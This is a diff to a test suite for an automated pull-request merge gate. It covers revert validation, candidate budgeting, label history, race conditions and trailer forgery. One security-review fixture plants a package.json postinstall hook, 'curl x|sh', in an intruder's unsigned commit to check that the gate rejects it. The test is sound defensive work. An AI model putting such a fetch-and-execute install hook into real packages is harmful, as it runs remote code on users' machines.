@@ -3,6 +3,7 @@ verdict, the revert path, the message, the comment upsert, the token checks of `
 call budget."""
 import json
 import os
+import re
 import subprocess
 import sys
 
@@ -192,20 +193,34 @@ expect("a merge-freeze issue is open", w, 5, "wait", "freeze")
 
 
 # ── the revert path ──────────────────────────────────────────────────────────────────────────────
-def revert_world(develop_green=False, freeze=True, files_same=True, trailer=0, merged_by=APP_BOT, author=APP_BOT):
+APP_REVERT_COMMIT = {"author": APP_BOT, "committer": "web-flow", "message": "revert: docs: x (#4)", "verified": True}
+
+
+def revert_world(develop_green=False, freeze=True, files_same=True, trailer=0, merged_by=APP_BOT, author=APP_BOT,
+                 commits=None, content_same=True, marker_sha=None, mergeable=True, develop="red", gate_line=True,
+                 orig_files=None, rev_files=None, contents=None):
     w = world()
-    if not develop_green:
+    if develop_green:
+        develop = "green"
+    if develop == "red":
         w.develop(H.sha(900), green=False)
+    elif develop == "pending":
+        w.runs(H.sha(900), [run(899, "ci.yml", "push", "develop", H.sha(900), [job("test", status="in_progress")])])
     if freeze:
         w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, [{"number": 40}])
-    f = H.sha(777)
-    body = "<!-- revert-of: #4 sha: %s -->\nReverts #4" % f
+    f, parent = H.sha(777), H.sha(776)
+    body = "<!-- revert-of: #4 sha: %s -->\nReverts #4" % (marker_sha or f)
     p = add_pr(w, 9, author=author, labels=("revert-on-red", "riesgo:0", "semver:none"), body=body,
-               title="revert: docs: x (#4)", files=("docs/a.md",))
+               title="revert: docs: x (#4)", files=rev_files or ("docs/a.md",), mergeable=mergeable)
     w.pull(4, state="closed", merged_at="2026-10-01T09:00:00Z", merge_commit_sha=f, merged_by=merged_by)
-    w.files(4, ["docs/a.md"] if files_same else ["docs/b.md"])
-    w.r("GET", "repos/%s/commits/%s" % (R, f), {"sha": f, "parents": [{"sha": "x"}],
-                                               "commit": {"message": "docs: x (#4)\n\nRisk-class: riesgo:%d\n" % trailer}})
+    w.files(4, orig_files or (["docs/a.md"] if files_same else ["docs/b.md"]))
+    msg = "docs: x (#4)\n\nRisk-class: riesgo:%d\n%s" % (trailer, "Merge-gate: merge-when-green https://x/run/0\n"
+                                                         if gate_line else "")
+    w.r("GET", "repos/%s/commits/%s" % (R, f), {"sha": f, "parents": [{"sha": parent}], "commit": {"message": msg}})
+    w.commits(9, commits or [APP_REVERT_COMMIT])
+    for path, (before, after) in (contents or {"docs/a.md": ("before\n", "before\n" if content_same else "evil\n")}).items():
+        w.file(path, before, ref=parent)
+        w.file(path, after, ref=p["head"]["sha"])
     return w, p
 
 
@@ -219,6 +234,37 @@ w, _ = revert_world(merged_by="igonzalezespi")
 expect("a revert of a person's merge", w, 9, "skip", "not merged by the App")
 w, _ = revert_world(author="dev")
 expect("revert-on-red on a PR the App did not open", w, 9, "skip", "opened by the merge App")
+w, _ = revert_world(develop_green=True, freeze=False)
+expect("develop green again (a fix went in first): the revert is not merged", w, 9, "skip", "green again")
+w, _ = revert_world(develop_green=True)
+expect("develop green again, freeze still open: not merged either", w, 9, "skip", "green again")
+w, _ = revert_world(freeze=False)
+expect("no merge-freeze issue open: nobody asked for this revert", w, 9, "skip", "merge-freeze")
+w, _ = revert_world(develop="pending")
+expect("develop pending: the revert waits for its verdict", w, 9, "wait", "is pending")
+w, _ = revert_world(commits=[APP_REVERT_COMMIT, {"author": "dev", "committer": "dev", "message": "sneak", "verified": False}])
+expect("a commit pushed on top of the App's revert", w, 9, "skip", "2 commits")
+w, _ = revert_world(commits=[{"author": "dev", "committer": "dev", "message": "revert", "verified": True}])
+expect("the revert's single commit is not the App's", w, 9, "skip", "not the App's signed commit")
+w, _ = revert_world(commits=[dict(APP_REVERT_COMMIT, verified=False)])
+expect("the App's name on an unsigned commit", w, 9, "skip", "unsigned")
+w, _ = revert_world(content_same=False)
+expect("same files, other content (same line counts)", w, 9, "skip", "is not what it was before #4")
+w, _ = revert_world(marker_sha=H.sha(778))
+expect("the revert-of marker names another commit", w, 9, "skip", "is not merged as")
+w, _ = revert_world(gate_line=False)
+expect("a Risk-class line without the gate's Merge-gate line is no trailer", w, 9, "skip", "no Risk-class trailer")
+w, _ = revert_world(mergeable=False)
+expect("a revert in conflict", w, 9, "skip", "conflicts")
+w, _ = revert_world(orig_files=[{"filename": "docs/b.md", "previous_filename": "docs/a.md", "status": "renamed"}],
+                    rev_files=[{"filename": "docs/a.md", "previous_filename": "docs/b.md", "status": "renamed"}],
+                    contents={"docs/a.md": ("before\n", "before\n"), "docs/b.md": (None, None)})
+expect("the revert of a rename (names compared old and new)", w, 9, "merge", "reverts #4")
+# the security review's case: an intruder's commit with a postinstall on the revert branch
+w, p9 = revert_world(rev_files=[{"filename": "package.json", "patch": '+ "scripts":{"postinstall":"curl x|sh"}'}],
+                     orig_files=["package.json"], contents={"package.json": ("{}", '{"scripts":{"postinstall":"curl x|sh"}}')},
+                     commits=[{"author": "intruso", "committer": "intruso", "verified": False}])
+expect("an intruder's commit on the revert branch never rides the revert path", w, 9, "skip", "invalid revert")
 
 # ── sweep ────────────────────────────────────────────────────────────────────────────────────────
 def sweep(w, mode="dry", extra=(), env=None):
@@ -229,6 +275,8 @@ def sweep(w, mode="dry", extra=(), env=None):
         res["plan"] = json.load(open(plan))
     except (OSError, ValueError):
         res["plan"] = {}
+    if os.path.exists(plan):
+        os.unlink(plan)
     return res
 
 
@@ -392,8 +440,12 @@ S.check("escalate refuses without an App token", res["rc"] == 2)
 
 
 # ── the repo read from a local sparse checkout (what the reusable workflow does) ────────────────
+import atexit  # noqa: E402
+import shutil  # noqa: E402
 import tempfile  # noqa: E402
 d = tempfile.mkdtemp()
+SUMMARY_DIR = d
+atexit.register(shutil.rmtree, d, True)
 os.makedirs(os.path.join(d, ".github", "workflows"))
 os.makedirs(os.path.join(d, "scripts", "hooks"))
 json.dump({"agent_may_merge": True, "protected_branch": "main", "integration_branch": "develop"},
@@ -447,10 +499,33 @@ S.check("sweep: a stale riesgo label is replaced", any(c["method"] == "DELETE" a
 w = world(max_candidates=1); a = w.green_pr(5); w.files(5, [".github/workflows/x.yml"]); b = w.green_pr(6, created="2026-10-01T10:30:00Z")
 w.files(6, ["docs/x.md"]); w.open_pulls([a, b])
 res = sweep(w)
-S.check("sweep: max_candidates bounds the dynamic evaluations", any(d["pr"] == 6 and "max_candidates" in " ".join(d["reasons"])
-                                                                   for d in res["plan"].get("decisions", [])), res["plan"].get("decisions"))
+S.check("sweep: max_candidates bounds the CI evaluations, mergeable classes first",
+        res["outputs"].get("merge_pr") == "6" and any(d["pr"] == 5 and "max_candidates" in " ".join(d["reasons"])
+                                                     for d in res["plan"].get("decisions", [])), res["plan"].get("decisions"))
+w = world()
+olds = []
+for i, n in enumerate(range(20, 25)):
+    olds.append(w.green_pr(n, created="2026-09-%02dT10:00:00Z" % (20 + i)))
+    w.files(n, ["CLAUDE.md"])
+new = w.green_pr(30, created="2026-10-01T09:00:00Z"); w.files(30, ["docs/x.md"])
+w.open_pulls(olds + [new])
+res = sweep(w, "live")
+S.check("sweep: five older riesgo-2 PRs above max_auto_class do not starve a new riesgo-0",
+        res["outputs"].get("merge_pr") == "30", [(d["pr"], d["decision"], d["reasons"][:1]) for d in res["plan"].get("decisions", [])])
+w = world()
+olds = []
+for i, n in enumerate(range(20, 25)):
+    olds.append(w.green_pr(n, created="2026-09-%02dT10:00:00Z" % (20 + i)))
+    w.files(n, ["CLAUDE.md"])
+wf = w.green_pr(31, created="2026-10-01T09:00:00Z"); w.files(31, [".github/workflows/x.yml"])
+w.open_pulls(olds + [wf])
+res2 = sweep(w, "live")
+S.check("sweep: older riesgo-2 PRs do not eat the budget a riesgo-3 needs to be escalated",
+        res2["outputs"].get("escalate_prs") == "[31]", [(d["pr"], d["decision"], d["reasons"][:1]) for d in res2["plan"].get("decisions", [])])
+S.check("sweep: riesgo-2 above max_auto_class is decided without reading its CI",
+        not any("head_sha=%s" % H.sha(20) in c["path"] for c in res["calls"]), [c["path"] for c in res["calls"] if "head_sha" in c["path"]])
 w = world(); add_pr(w, 5)
-res = H.run_script(PM, ["sweep", "--repo", R, "--mode", "dry", "--pr", "5"], w, {"GITHUB_STEP_SUMMARY": os.path.join(tempfile.mkdtemp(), "s.md")})
+res = H.run_script(PM, ["sweep", "--repo", R, "--mode", "dry", "--pr", "5"], w, {"GITHUB_STEP_SUMMARY": os.path.join(SUMMARY_DIR, "s.md")})
 S.check("sweep writes the job summary table", res["rc"] == 0 and "| #5 | merge |" in res["out"], res["out"][-400:])
 res = H.run_script(PM, ["decide", "--repo", R, "--pr", "5"], w)
 S.check("decide prints a one-line verdict without --json", res["rc"] == 0 and res["out"].startswith("#5 MERGE"), res["out"])
@@ -466,7 +541,51 @@ res = H.run_script(PM, ["escalate", "--repo", R, "--pr", "5"], w, APP_ENV)
 S.check("escalate: already labelled -> nothing", res["rc"] == 0 and not H.writes(res))
 
 
-w = world(); add_pr(w, 5, labels=("semver:patch", "revision-humana"))
+# ── a person was asked once: removing the label does not send it back ─────────────────────────────
+w = world(); add_pr(w, 5); w.events(5, ["revision-humana"])
+expect("revision-humana added and then removed: still with a person", w, 5, "skip", "at some point")
+w = world(); add_pr(w, 5); w.events(5, ["semver:patch", "riesgo:0"])
+expect("other labels in the history do not hold it", w, 5, "merge")
+
+# ── what changes while deciding ────────────────────────────────────────────────────────────────
+w = world(); p = add_pr(w, 5)
+w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, head=dict(p["head"], sha=H.sha(55)))}])
+expect("the head moved while deciding", w, 5, "wait", "head moved")
+w = world(); p = add_pr(w, 5)
+w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, base=dict(p["base"], ref="main"))}])
+expect("re-pointed to main while deciding", w, 5, "skip", "changed while deciding")
+w = world(); p = add_pr(w, 5)
+w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, labels=p["labels"] + [{"name": "semver:minor"}])}])
+expect("a label added while deciding", w, 5, "wait", "labels changed")
+w = merge_world(); p = w.routes["GET repos/%s/pulls/5" % R]["body"]
+w.seq("GET", "repos/%s/pulls/5" % R, [{"body": p}, {"body": dict(p, base=dict(p["base"], ref="main"))}])
+res = merge(w)
+S.check("merge: a PR re-pointed to main between the decision and the PUT is never PUT",
+        not H.writes(res, "PUT") and res["rc"] == 40, (res["rc"], res["out"], res["err"]))
+
+# ── the author cannot write the gate's trailers ─────────────────────────────────────────────────
+w = world(); add_pr(w, 5, title="Risk-class: riesgo:3")
+w.commits(5, [{"author": "dev", "committer": "dev", "message": "docs: a\n\nRisk-class: riesgo:3\nMerge-gate: merge-when-green x"}])
+res = sweep(w)
+msg = next((d.get("message") for d in res["plan"].get("decisions", []) if d.get("message")), {}) or {}
+pm = H._load()["merge-when-green/pr-merge.sh"]
+S.check("message: the author's Risk-class/Merge-gate lines are neutralised, the gate's trailer is the one read",
+        pm.trailer_class(msg.get("body", "")) == 0 and not re.search(r"^Risk-class: riesgo:3", msg.get("body", ""), re.M)
+        and not msg.get("title", "").startswith("Risk-class:"), msg)
+S.check("trailer_class: the last Risk-class line, only with the gate's Merge-gate line after it",
+        pm.trailer_class("x\n\nRisk-class: riesgo:3\n\nRisk-class: riesgo:1\nMerge-gate: merge-when-green u") == 1
+        and pm.trailer_class("x\n\nRisk-class: riesgo:1") is None
+        and pm.trailer_class("Merge-gate: merge-when-green u\nRisk-class: riesgo:1") is None)
+
+# ── a bot pin-only workflow PR (riesgo-1) never merges: the App has no workflows permission ─────────
+PIN = ("@@ -10,3 +10,3 @@\n     steps:\n-      - uses: actions/checkout@aaaa # v6.0.0\n"
+       "+      - uses: actions/checkout@bbbb # v6.0.1\n")
+w = world(max_auto_class=1); add_pr(w, 5, files=[{"filename": ".github/workflows/ci.yml", "patch": PIN}],
+                                     author="renovate[bot]", body="Renovate")
+w.commits(5, [{"author": "renovate[bot]", "committer": "web-flow", "message": "ci: pin", "verified": True}])
+expect("a bot's pin-only workflow bump (riesgo-1) is not merged by the App", w, 5, "skip", "touches .github/workflows")
+
+w = world(); add_pr(w, 5, labels=("semver:patch", "revision-humana")); w.events(5, ["revision-humana"])
 sc = os.path.join(H.ROOT, "merge-when-green", "selftest.json")
 res = sweep(w, extra=["--pr", "5", "--comment", "false", "--labels", "false", "--selftest-config", sc])
 S.check("self-test: looks past the hold label and runs the whole decision, writing nothing",
